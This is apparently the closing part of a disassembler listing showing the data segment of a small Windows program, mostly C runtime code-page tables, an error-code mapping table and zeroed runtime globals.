.data:00407730 byte_407730     db 1                    ; DATA XREF: __setmbcp+E1r
.data:00407731                 db    2
.data:00407732                 db    4
.data:00407733                 db    8
.data:00407738 unk_407738      db 0A4h ; ñ             ; DATA XREF: __setmbcp+2Fo
.data:00407739                 db    3
.data:0040773C dword_40773C    dd 82798260h            ; DATA XREF: __setmbcp+11Dr
.data:00407740                 db  21h ; !
.data:00407748 dword_407748    dd 0DFA6h               ; DATA XREF: __setmbcp+C0r
.data:0040774C                 align 10h
.data:00407750                 db 0A1h ; í
.data:00407751                 db 0A5h ; Ñ
.data:00407758                 db  81h ; ü
.data:00407759                 db  9Fh ; ƒ
.data:0040775A                 db 0E0h ; a
.data:0040775B                 db 0FCh ; n
.data:00407760                 db  40h ; @
.data:00407761                 db  7Eh ; ~
.data:00407762                 db  80h ; Ç
.data:00407763                 db 0FCh ; n
.data:00407768                 db 0A8h ; ¿
.data:00407769                 db    3
.data:0040776C                 db 0C1h ; -
.data:0040776D                 db 0A3h ; ú
.data:0040776E                 db 0DAh ; +
.data:0040776F                 db 0A3h ; ú
.data:00407770                 db  20h
.data:00407788                 db  81h ; ü
.data:00407789                 db 0FEh ; ¦
.data:00407790                 db  40h ; @
.data:00407791                 db 0FEh ; ¦
.data:00407798                 db 0B5h ; ¦
.data:00407799                 db    3
.data:0040779C                 db 0C1h ; -
.data:0040779D                 db 0A3h ; ú
.data:0040779E                 db 0DAh ; +
.data:0040779F                 db 0A3h ; ú
.data:004077A0                 db  20h
.data:004077B8                 db  81h ; ü
.data:004077B9                 db 0FEh ; ¦
.data:004077C0                 db  41h ; A
.data:004077C1                 db 0FEh ; ¦
.data:004077C8                 db 0B6h ; ¦
.data:004077C9                 db    3
.data:004077CC                 db 0CFh ; -
.data:004077CD                 db 0A2h ; ó
.data:004077CE                 db 0E4h ; S
.data:004077CF                 db 0A2h ; ó
.data:004077D0                 db  1Ah
.data:004077D2                 db 0E5h ; s
.data:004077D3                 db 0A2h ; ó
.data:004077D4                 db 0E8h ; F
.data:004077D5                 db 0A2h ; ó
.data:004077D6                 db  5Bh ; [
.data:004077E8                 db  81h ; ü
.data:004077E9                 db 0FEh ; ¦
.data:004077F0                 db  40h ; @
.data:004077F1                 db  7Eh ; ~
.data:004077F2                 db 0A1h ; í
.data:004077F3                 db 0FEh ; ¦
.data:004077F8                 db  51h ; Q
.data:004077F9                 db    5
.data:004077FC                 db  51h ; Q
.data:004077FD                 db 0DAh ; +
.data:004077FE                 db  5Eh ; ^
.data:004077FF                 db 0DAh ; +
.data:00407800                 db  20h
.data:00407802                 db  5Fh ; _
.data:00407803                 db 0DAh ; +
.data:00407804                 db  6Ah ; j
.data:00407805                 db 0DAh ; +
.data:00407806                 db  32h ; 2
.data:00407818                 db  81h ; ü
.data:00407819                 db 0D3h ; +
.data:0040781A                 db 0D8h ; +
.data:0040781B                 db 0DEh ; ¦
.data:0040781C                 db 0E0h ; a
.data:0040781D                 db 0F9h ; ·
.data:00407820                 db  31h ; 1
.data:00407821                 db  7Eh ; ~
.data:00407822                 db  81h ; ü
.data:00407823                 db 0FEh ; ¦
.data:00407830 off_407830      dd offset off_407830    ; DATA XREF: sub_4044F0+Do
.data:00407830                                         ; sub_4044F0+69o ...
.data:00407834 off_407834      dd offset off_407830    ; DATA XREF: sub_4044F0:loc_404570r
.data:00407834                                         ; sub_4044F0+89w ...
.data:00407838                 dd offset unk_407848
.data:0040783C                 dd offset unk_407848
.data:00407840 dword_407840    dd 0FFFFFFFFh           ; DATA XREF: sub_4044F0r
.data:00407840                                         ; sub_404634:loc_404681w
.data:00407844                 db 0FFh
.data:00407845                 db 0FFh
.data:00407846                 db 0FFh
.data:00407847                 db 0FFh
.data:00407848 unk_407848      db 0F0h ; =             ; DATA XREF: .data:00407838o
.data:00407848                                         ; .data:0040783Co
.data:0040784C                 db 0F1h ; ±
.data:00409850 off_409850      dd offset off_407830    ; DATA XREF: sub_404634+15r
.data:00409850                                         ; sub_404634+20w ...
.data:00409854 dword_409854    dd 1E0h                 ; DATA XREF: sub_402A9A:loc_402AD6r
.data:00409854                                         ; sub_402F9A+51r
.data:00409858                 align 10h
.data:00409860 ; int cchMultiByte
.data:00409860 cchMultiByte    dd 1                    ; DATA XREF: _wctomb+31r
.data:00409860                                         ; _strtoxl:loc_4038E4r ...
.data:00409864                 db  2Eh ; .
.data:00409868                 db    1
.data:00409870 unk_409870      db    1                 ; DATA XREF: sub_40592C+Co
.data:00409874 dword_409874    dd 16h                  ; DATA XREF: sub_40592C:loc_405961r
.data:00409878                 db    2
.data:0040987C                 db    2
.data:00409880                 db    3
.data:00409884                 db    2
.data:00409888                 db    4
.data:0040988C                 db  18h
.data:00409890                 db    5
.data:00409894                 db  0Dh
.data:00409898                 db    6
.data:0040989C                 db    9
.data:004098A0                 db    7
.data:004098A4                 db  0Ch
.data:004098A8                 db    8
.data:004098AC                 db  0Ch
.data:004098B0                 db    9
.data:004098B4                 db  0Ch
.data:004098B8                 db  0Ah
.data:004098BC                 db    7
.data:004098C0                 db  0Bh
.data:004098C4                 db    8
.data:004098C8                 db  0Ch
.data:004098CC                 db  16h
.data:004098D0                 db  0Dh
.data:004098D4                 db  16h
.data:004098D8                 db  0Fh
.data:004098DC                 db    2
.data:004098E0                 db  10h
.data:004098E4                 db  0Dh
.data:004098E8                 db  11h
.data:004098EC                 db  12h
.data:004098F0                 db  12h
.data:004098F4                 db    2
.data:004098F8                 db  21h ; !
.data:004098FC                 db  0Dh
.data:00409900                 db  35h ; 5
.data:00409904                 db    2
.data:00409908                 db  41h ; A
.data:0040990C                 db  0Dh
.data:00409910                 db  43h ; C
.data:00409914                 db    2
.data:00409918                 db  50h ; P
.data:0040991C                 db  11h
.data:00409920                 db  52h ; R
.data:00409924                 db  0Dh
.data:00409928                 db  53h ; S
.data:0040992C                 db  0Dh
.data:00409930                 db  57h ; W
.data:00409934                 db  16h
.data:00409938                 db  59h ; Y
.data:0040993C                 db  0Bh
.data:00409940                 db  6Ch ; l
.data:00409944                 db  0Dh
.data:00409948                 db  6Dh ; m
.data:0040994C                 db  20h
.data:00409950                 db  70h ; p
.data:00409954                 db  1Ch
.data:00409958                 db  72h ; r
.data:0040995C                 db    9
.data:00409960                 db    6
.data:00409964                 db  16h
.data:00409968                 db  80h ; Ç
.data:0040996C                 db  0Ah
.data:00409970                 db  81h ; ü
.data:00409974                 db  0Ah
.data:00409978                 db  82h ; é
.data:0040997C                 db    9
.data:00409980                 db  83h ; â
.data:00409984                 db  16h
.data:00409988                 db  84h ; ä
.data:0040998C                 db  0Dh
.data:00409990                 db  91h ; æ
.data:00409994                 db  29h ; )
.data:00409998                 db  9Eh ; P
.data:0040999C                 db  0Dh
.data:004099A0                 db 0A1h ; í
.data:004099A4                 db    2
.data:004099A8                 db 0A4h ; ñ
.data:004099AC                 db  0Bh
.data:004099B0                 db 0A7h ; º
.data:004099B4                 db  0Dh
.data:004099B8                 db 0B7h ; +
.data:004099BC                 db  11h
.data:004099C0                 db 0CEh ; +
.data:004099C4                 db    2
.data:004099C8                 db 0D7h ; +
.data:004099CC                 db  0Bh
.data:004099D0                 db  18h
.data:004099D1                 db    7
.data:004099D4                 db  0Ch
.data:004099D8 ; char *dword_4099D8
.data:004099D8 dword_4099D8    dd 0                    ; DATA XREF: start+84w
.data:004099D8                                         ; __setenvp:loc_401F5Ar ...
.data:004099DC                 align 10h
.data:004099E0 dword_4099E0    dd 0                    ; DATA XREF: __amsg_exitr
.data:004099E0                                         ; _fast_error_exitr ...
.data:004099E4 dword_4099E4    dd 0                    ; DATA XREF: __stbuf+37r
.data:004099EC dword_4099EC    dd 0                    ; DATA XREF: __stbuf:loc_401301w
.data:004099EC                                         ; __getbufw
.data:004099F0 dword_4099F0    dd 0                    ; DATA XREF: _wctomb:loc_402D84w
.data:004099F0                                         ; _strtoxl+1B9w ...
.data:004099F4 dword_4099F4    dd 0                    ; DATA XREF: __commit+44w
.data:004099F4                                         ; __write+11Bw ...
.data:004099FC dword_4099FC    dd 0                    ; DATA XREF: start+52w
.data:00409A00 dword_409A00    dd 0                    ; DATA XREF: start+49w
.data:00409A04 dword_409A04    dd 0                    ; DATA XREF: start+3Ew
.data:00409A08 dword_409A08    dd 0                    ; DATA XREF: start+30w
.data:00409A0C ; int argc
.data:00409A0C argc            dd 0                    ; DATA XREF: start+A9r
.data:00409A0C                                         ; __setargv+91w
.data:00409A10 ; char **argv
.data:00409A10 argv            dd 0                    ; DATA XREF: start+A3r
.data:00409A10                                         ; __setargv+89w
.data:00409A14                 align 8
.data:00409A18 ; char *envp
.data:00409A18 envp            dd 0                    ; DATA XREF: start+98r
.data:00409A18                                         ; __setenvp+44w
.data:00409A1C dword_409A1C    dd 0                    ; DATA XREF: start+9Dw
.data:00409A28 dword_409A28    dd 0                    ; DATA XREF: __setargv+2Ew
.data:00409A2C                 align 10h
.data:00409A30 byte_409A30     db 0                    ; DATA XREF: .text:00401CB3r
.data:00409A30                                         ; _doexit+2Dw
.data:00409A31                 align 4
.data:00409A34 dword_409A34    dd 0                    ; DATA XREF: _doexit+27w
.data:00409A38 dword_409A38    dd 0                    ; DATA XREF: _doexit+4r
.data:00409A38                                         ; _doexit+8Bw
.data:00409A3C dword_409A3C    dd 0                    ; DATA XREF: __XcptFilter+3Ar
.data:00409A3C                                         ; __XcptFilter+46w ...
.data:00409A40 ; char Filename[]
.data:00409A40 Filename        db 104h dup(0)          ; DATA XREF: __setargv:loc_402018o
.data:00409B44 dword_409B44    dd 0                    ; DATA XREF: ___crtGetEnvironmentStringsA+2r
.data:00409B44                                         ; ___crtGetEnvironmentStringsA+23w ...
.data:00409B48 dword_409B48    dd 0                    ; DATA XREF: __FF_MSGBANNER+21r
.data:00409B4C dword_409B4C    dd 0                    ; DATA XREF: __setmbcp:loc_40331Br
.data:00409B4C                                         ; _getSystemCP+4w ...
.data:00409B50 dword_409B50    dd 0                    ; DATA XREF: sub_40468A+4Bw
.data:00409B50                                         ; sub_4047A3+2Dw ...
.data:00409B54 dword_409B54    dd 0                    ; DATA XREF: ___crtMessageBoxA+3r
.data:00409B54                                         ; ___crtMessageBoxA+2Ew ...
.data:00409B58 dword_409B58    dd 0                    ; DATA XREF: ___crtMessageBoxA+43w
.data:00409B58                                         ; ___crtMessageBoxA:loc_404B63r
.data:00409B5C dword_409B5C    dd 0                    ; DATA XREF: ___crtMessageBoxA+4Aw
.data:00409B5C                                         ; ___crtMessageBoxA+60r
.data:00409B60 dword_409B60    dd 0                    ; DATA XREF: _mallocr
.data:00409B60                                         ; sub_402F9A:loc_40301Ar
.data:00409B64 dword_409B64    dd 0                    ; DATA XREF: __callnewhr
.data:00409B68                 align 10h
.data:00409B70 ; LCID Locale
.data:00409B70 Locale          dd 0                    ; DATA XREF: _wctomb:loc_402D37r
.data:00409B70                                         ; ___crtGetStringTypeA+7Br ...
.data:00409B74                 align 10h
.data:00409B80 ; UINT CodePage
.data:00409B80 CodePage        dd 0                    ; DATA XREF: _wctomb+43r
.data:00409B80                                         ; _getSystemCP+3Ar ...
.data:00409B84                 align 8
.data:00409B88 dword_409B88    dd 0                    ; DATA XREF: ___crtLCMapStringA+28r
.data:00409B88                                         ; ___crtLCMapStringA+4Cw ...
.data:00409B8C dword_409B8C    dd 0                    ; DATA XREF: ___crtGetStringTypeA+26r
.data:00409B8C                                         ; ___crtGetStringTypeA:loc_405317w
.data:00409B90 dword_409B90    dd 0                    ; DATA XREF: ___sbh_heap_init+3Cw
.data:00409B90                                         ; ___sbh_alloc_new_region+5r ...
.data:00409B94 dword_409B94    dd 0                    ; DATA XREF: sub_403D12+23Ar
.data:00409B94                                         ; sub_403D12+25Ar ...
.data:00409B98 dword_409B98    dd 0                    ; DATA XREF: ___sbh_heap_init+31w
.data:00409B98                                         ; sub_403D12+311w ...
.data:00409B9C dword_409B9C    dd 0                    ; DATA XREF: ___sbh_heap_init+21w
.data:00409B9C                                         ; sub_403D12+22Dr ...
.data:00409BA0 dword_409BA0    dd 0                    ; DATA XREF: ___sbh_heap_init+28w
.data:00409BA0                                         ; ___sbh_find_blockr ...
.data:00409BA4 ; LPVOID lpMem
.data:00409BA4 lpMem           dd 0                    ; DATA XREF: ___sbh_heap_init+15w
.data:00409BA4                                         ; ___sbh_find_block+8r ...
.data:00409BA8 dword_409BA8    dd 0                    ; DATA XREF: sub_402A9A+Fr
.data:00409BA8                                         ; sub_402F9A+35r ...
.data:00409BAC ; UINT dword_409BAC
.data:00409BAC dword_409BAC    dd 0                    ; DATA XREF: __setmbcp+14r
.data:00409BAC                                         ; __setmbcp+65w ...
.data:00409BB0                                         ; __setmbcp+171o ...
.data:00409BBC dword_409BBC    dd 0                    ; DATA XREF: __setmbcp+108w
.data:00409BBC                                         ; __setmbcp+15Dw ...
.data:00409BC0 byte_409BC0     db 0                    ; DATA XREF: _setSBUpLow:loc_4034EBw
.data:00409BC0                                         ; _setSBUpLow:loc_403508w ...
.data:00409CC0                                         ; __setmbcp+AFo ...
.data:00409CC1 byte_409CC1     db 0                    ; DATA XREF: _parse_cmdline+3Fr
.data:00409CC1                                         ; _parse_cmdline+84r ...
.data:00409DC4 ; LCID dword_409DC4
.data:00409DC4 dword_409DC4    dd 0                    ; DATA XREF: __setmbcp+6Ew
.data:00409DC4                                         ; __setmbcp+12Bw ...
.data:00409DC8 ; HANDLE hHeap
.data:00409DC8 hHeap           dd 0                    ; DATA XREF: sub_4026A0+19w
.data:00409DC8                                         ; sub_4026A0+4Ar ...
.data:00409DCC dword_409DCC    dd 0                    ; DATA XREF: sub_4026A0+28w
.data:00409DCC                                         ; sub_402A9Ar ...
.data:00409DE0 dword_409DE0    dd 0                    ; DATA XREF: .text:00401C8Ar
.data:00409DE0                                         ; __ioinit:loc_4023A0w ...
.data:00409EE0 ; UINT uNumber
.data:00409EE0 uNumber         dd 0                    ; DATA XREF: __ioinit+26w
.data:00409EE0                                         ; __ioinit:loc_40240Ar ...
.data:00409EE4 dword_409EE4    dd 0                    ; DATA XREF: __setenvp+ADw
.data:00409EE8 dword_409EE8    dd 0                    ; DATA XREF: __setenvp+3r
.data:00409EE8                                         ; __setargv+8r ...
.data:00409EEC dword_409EEC    dd 0                    ; DATA XREF: _doexit+3Er
.data:00409EF0 dword_409EF0    dd 0                    ; DATA XREF: _doexit+35r
.data:00409EF0                                         ; _doexit+57r
.data:00409EF4 dword_409EF4    dd 0                    ; DATA XREF: __cinitr
.data:00409EF8 dword_409EF8    dd 0                    ; DATA XREF: .text:00401C31w
.data:00409EF8                                         ; .text:00401C4Aw ...
.data:00409EFC                 align 10h
.data:0040AF00 dword_40AF00    dd ?                    ; DATA XREF: .text:___initstdior
.data:0040AF00                                         ; .text:loc_401C23w ...
.data:0040AF04 dword_40AF04    dd ?                    ; DATA XREF: start+7Aw
.data:0040AF04                                         ; __setargv+29r
.data:0040AF04 _data           ends
.data:0040AF04
.data:0040AF04
.data:0040AF04                 end start
